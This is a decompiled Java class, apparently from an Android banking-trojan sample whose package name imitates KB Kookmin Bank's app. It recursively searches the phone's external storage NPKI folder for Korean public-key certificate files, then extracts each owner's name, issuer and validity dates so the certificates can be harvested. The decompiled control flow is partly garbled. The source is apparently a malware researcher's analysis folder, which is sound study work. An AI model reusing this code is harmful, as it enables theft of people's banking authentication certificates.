package com.kbstar.kb.android.star.util;

import android.annotation.SuppressLint;
import android.os.Environment;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.security.Principal;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;

public class NPUtil
{
  private static final String NPKI = "NPKI";
  public static String SDCardRoot = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator;
  private static List<Map<String, String>> derList;
  public static String getFolder = SDCardRoot + "NPKI" + File.separator;
  
  @SuppressLint({"SimpleDateFormat"})
  private static String getCertEndDate(X509Certificate paramX509Certificate, int paramInt)
  {
    if (paramInt == 1) {
      return new SimpleDateFormat("yyyy-MM-dd").format(paramX509Certificate.getNotAfter());
    }
    if (paramInt == 2) {
      return new SimpleDateFormat("yyyy-MM-dd").format(paramX509Certificate.getNotAfter());
    }
    if (paramInt == 3) {
      return new SimpleDateFormat("yyyy-MM-dd").format(paramX509Certificate.getNotAfter());
    }
    if (paramInt == 4) {
      return new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(paramX509Certificate.getNotAfter());
    }
    if (paramInt == 5) {
      return new SimpleDateFormat("yyyy-MM-dd").format(paramX509Certificate.getNotAfter());
    }
    return "";
  }
  
  @SuppressLint({"SimpleDateFormat"})
  private static String getCertStartDate(X509Certificate paramX509Certificate)
  {
    return new SimpleDateFormat("yyyy-MM-dd").format(paramX509Certificate.getNotBefore());
  }
  
  private static void getDerList(File[] paramArrayOfFile)
  {
    int i;
    if ((paramArrayOfFile != null) && (paramArrayOfFile.length > 0))
    {
      i = 0;
      if (i < paramArrayOfFile.length) {}
    }
    else
    {
      return;
    }
    if (paramArrayOfFile[i].isDirectory()) {
      getDerList(paramArrayOfFile[i].listFiles());
    }
    for (;;)
    {
      i += 1;
      break;
      Object localObject = paramArrayOfFile[i].getName();
      if ((((String)localObject).endsWith(".der")) || (((String)localObject).endsWith(".DER")))
      {
        localObject = new HashMap();
        ((HashMap)localObject).put(paramArrayOfFile[i].getPath(), paramArrayOfFile[i].getName());
        derList.add(localObject);
      }
    }
  }
  
  public static List<Map<Object, Object>> getMostMatch(File paramFile, int paramInt)
  {
    derList = new ArrayList();
    getDerList(paramFile.listFiles());
    paramFile = new ArrayList();
    paramInt = 0;
    if (paramInt >= derList.size()) {
      return paramFile;
    }
    Iterator localIterator = ((Map)derList.get(paramInt)).entrySet().iterator();
    for (;;)
    {
      if (!localIterator.hasNext())
      {
        paramInt += 1;
        break;
      }
      try
      {
        String str1 = (String)((Map.Entry)localIterator.next()).getKey();
        Object localObject1 = new FileInputStream(new File(str1));
        Object localObject3 = (X509Certificate)CertificateFactory.getInstance("X.509").generateCertificate((InputStream)localObject1);
        localObject1 = getName((X509Certificate)localObject3);
        String str2 = getCertEndDate((X509Certificate)localObject3, 5);
        String str3 = ((X509Certificate)localObject3).getIssuerDN().toString();
        Object localObject2 = ((String)localObject1).substring(0, 4).toLowerCase();
        localObject3 = getCertStartDate((X509Certificate)localObject3);
        if ((!((String)localObject2).equals("cros")) && (!((String)localObject2).equals("sign")) && (!((String)localObject2).equals("yess")) && (!((String)localObject2).equals("kisa")) && (!((String)localObject2).equals("trad")) && (!((String)localObject2).equals("ncas")))
        {
          localObject2 = new HashMap();
          ((HashMap)localObject2).put(str1, localObject1 + ":" + str3 + ":" + str2 + ":" + (String)localObject3);
          paramFile.add(localObject2);
        }
      }
      catch (Exception localException) {}
    }
  }
  
  private static String getName(X509Certificate paramX509Certificate)
  {
    paramX509Certificate = paramX509Certificate.getSubjectDN().toString().split(",", 10);
    int i = 0;
    for (;;)
    {
      if (i >= paramX509Certificate.length) {
        return "";
      }
      if (paramX509Certificate[i].substring(0, 3).equalsIgnoreCase("CN=")) {
        return paramX509Certificate[i].substring(3, paramX509Certificate[i].length());
      }
      i += 1;
    }
  }
  
  public static boolean isNPKIExists()
  {
    boolean bool = false;
    try
    {
      if ("mounted".equals(Environment.getExternalStorageState())) {
        bool = new File(SDCardRoot + "NPKI" + File.separator).exists();
      }
      return bool;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return false;
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/util/NPUtil.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */